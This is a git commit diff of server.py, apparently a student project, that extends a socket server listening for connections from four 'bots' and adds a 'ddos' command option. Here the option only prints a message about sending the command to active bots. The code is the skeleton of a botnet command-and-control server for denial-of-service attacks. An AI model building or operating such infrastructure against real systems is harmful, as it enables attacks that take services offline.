57d9deed7c3bc229ded33e27a742d9d5d034317d
Ashish Kumar Sathish <asathis2@gelib-4c-32.ews.illinois.edu>
2017-05-03 13:19:37 -0500

    implementing sending of messages to bots

--- server.py
+++ server.py
@@ -2,9 +2,17 @@ print("server started")
 #!/usr/bin/python           		# This is server.py file
 
 import socket               		# Import socket module
+import sys
 
 conn_bot_1 = conn_bot_2 = conn_bot_3 = conn_bot_4 = 0
 
+class Bot(object):
+    """\
+    Simple class to track available workers
+    """
+    def __init__(self, id, name):
+        self.id = id
+        self.name = name
 s_1 = socket.socket()        	 	# Create a socket object for bot 1
 s_2 = socket.socket()         		# Create a socket object for bot 2
 s_3 = socket.socket()         		# Create a socket object for bot 3
@@ -21,12 +29,15 @@ s_1.bind((host, port_1))        	# Bind to the port for each bot
 s_2.bind((host, port_2))        	# Bind to the port for each bot
 s_3.bind((host, port_3))        	# Bind to the port for each bot
 s_4.bind((host, port_4))        	# Bind to the port for each bot
+commands = ['ddos']
 
 s_1.listen(5)                 		# Now wait for client connection on bot 1.
 s_2.listen(5)                 		# Now wait for client connection on bot 2.
 s_3.listen(5)                 		# Now wait for client connection on bot 3.
 s_4.listen(5)                 		# Now wait for client connection on bot 4.
 
+if( sys.argv[1] == commands[0]):
+	print "Send ddos command to all active bots"
 while True:
 	try:
 		if not conn_bot_1:
@@ -75,20 +86,3 @@ while True:
 			c.close()                	# Close the connection
 	except:
 		pass
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
